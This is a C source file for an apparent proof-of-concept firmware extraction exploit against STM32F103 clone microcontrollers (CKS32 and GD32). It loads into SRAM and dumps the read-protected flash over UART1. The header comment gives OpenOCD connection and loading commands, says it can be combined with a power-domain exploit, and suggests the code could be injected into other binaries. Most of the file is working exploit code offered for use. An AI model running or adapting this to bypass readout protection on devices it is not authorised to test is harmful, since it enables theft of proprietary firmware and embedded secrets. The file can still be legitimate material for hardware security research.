/*
Original Idea from pdf found on offzone russia about STM clones exploits 
There was no available POC code so i decided to swrite my own - pun intended 

This code makes use of two SRAM based exploits for CKS -aka- cks32f103c8t6 and GD aka GigaDevices gd32f103cc based stm32f103 clones 
for the cks this should just work, for the gd32 devies you need to apply either power domain exploit or hope it's rdp1 
how to use :-

compile the code with build.sh file 
load up openocd and connect to target - some targets may need BOOT0 and BOOT1 changed, for cks targets you only need to change boot0 , for GD32 targets you need to connect under reset 
openocd  -f interface/stlink.cfg  -f stm32f1x.cfg
openocd  -f interface/ftdi/dp_busblaster_kt-link.cfg  -c 'transport select swd' -f gd32f103.cfg

then issue the following commands 
     reset halt
     load_image  load_image sram-code/uart.sram.elf
     resume 0x20000001


if connected correctly to UART1 PA9/PA10 then you will see the flash dump via uart


*notes*
to use the stm32f103.cfg on cks targets you need to change the ID from  0x1ba01477 to 0x2ba01477 
just copy it to local place and edit the use -f stm32f103.cfg to load local file 




code should be injectable into binaries too 


*/

#define STM32F1
#define STM32F103xB
#include "stm32f1xx.h"


/*************************************************
* Main code starts from here
*************************************************/

int notmain ( void )
{

	// Set clock to 72 MHz using 8Mhz xtal 

    // set the number of wait states for Flash 
    FLASH->ACR = 0x12;
    // Enable HSE
    RCC->CR |= (1 << 16);
    // Wait untill HSE settles down
    while (!(RCC->CR & (1 << 17))) ;
    // Set PLL1 multiplication factor to 9
    RCC->CFGR |= (0b0111 << 18);
    // select PLL input clock from PREDIV1
    RCC->CFGR |= (1 << 16);
    // Set APB2 to 36MHz
    RCC->CFGR |= 0b100 << 11;
    // Set APB1 to 36MHz
    RCC->CFGR |= 0b100 << 8;
    // Enable PLL
    RCC->CR |= (1 << 24);
    // Wait untill PLL settles down
    while (!(RCC->CR & (1 << 25))) ;
    // Select the PLL as the system clock
    RCC->CFGR |= (0b10 << 0);
	// Enable alternate function clock. Bit 0 in RCC APB2ENR register
	RCC->APB2ENR |= (1 << 0);
	// Enable GPIOA clock. Bit 2 in RCC APB2ENR register
	RCC->APB2ENR |= (1 << 2);
	// Enable clock for UART1 clock. Bit 14 in RCC APB2ENR register
	RCC->APB2ENR |= (1 << 14);

	// Make GPIOA Pin 9,10 (PA9, PA10) alternate-function output (0b1010)
	GPIOA->CRH &= 0xFFFFF00F;
	GPIOA->CRH |= 0x00000BB0;

	// Enable USART
	USART1->CR1 |= (1 << 13);
	// Word length - leave default (8 data)
	USART1->CR1 |= (0 << 12);
	// Number of stop bits - leave default (1 stop)
	USART1->CR2 |= (0b00 << 12);
	// Baud rate
	// BRR should be 468.75 for 9600 baud rate
	// Thus manista is 468 (0x1d4) and fraction is 12 (0xc) (12/16 is .75)
	// Making it 0x1d4c
	//((SystemCoreClock*2)/9600)
	//int BRR_VALUE = ((SystemCoreClock_8*2)/9600)
	//USART1->BRR = ((SystemCoreClock_8*2)/9600);
	
	//currently running at 57600 with 8Mhz xtal 
	USART1->BRR = 0x271;
	
	//USART1->BRR = 0x1d4; //not used 
	
	// Transmitter enable
	USART1->CR1 |= (1 << 3);
	// Receiver enable
	USART1->CR1 |= (1 << 2);
	
	
	//configure gpio
	RCC->APB2ENR  |= RCC_APB2ENR_IOPAEN; 
    RCC->APB2ENR  |= RCC_APB2ENR_IOPBEN; 
		
	RCC->APB2ENR |= RCC_APB2ENR_SPI1EN;
	
	// Initialize the GPIOB pins.
	// A0 should be set to 'input' mode with pull-up.abd PB12 for debug LED

	
	GPIOB->CRH &= ~(GPIO_CRH_MODE12|GPIO_CRH_CNF12);    /* Clear MODE12 and CNF13 fields */
    GPIOB->CRH |= GPIO_CRH_MODE12_1|GPIO_CRH_MODE12_0;  /* Set MODE12 to 3 (Output) */

	//set input pins PA0
	GPIOA->CRL &= ~(GPIO_CRL_MODE0|GPIO_CRL_CNF0);     /* Clear MODE0 and CNF0 fields */
	GPIOA->CRL |= GPIO_CRL_CNF0_1;                     /* Set CNF0 to 10 (Input with pullup/pull down) */
	GPIOA->ODR |= GPIO_IDR_IDR0;                       /* pull-up PA0 */
  
	while (( GPIOA->IDR & GPIO_IDR_IDR0) != GPIO_IDR_IDR0 ) /* wait for PA0 to go high before you dump */
		{
	  
			}	
	
	for (int addr=0x8000000;addr <= 0x82fffff;addr++) /* Dump flash to UART0 TX PA9 */
	  {
		GPIOB->BSRR |= GPIO_BSRR_BS12; /* Turn on led on test board */
	  	for (int bv=0;bv<1000;bv++)
		{
		
			}
		USART1->DR = *((uint16_t*) addr );
		while(!(USART1->SR & (1 << 6)));
	
		GPIOB->BSRR |= GPIO_BSRR_BR12; /* turn off LED on testboard */ 
		for (int bv=0;bv<500;bv++)
			{
			
				}
		}
 
	
	// Should never reach here
	return (0);
}
